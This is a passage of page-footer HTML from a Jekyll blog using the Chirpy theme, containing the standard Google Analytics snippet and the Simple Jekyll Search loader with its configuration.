fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-177244605-1', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cantchasee.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
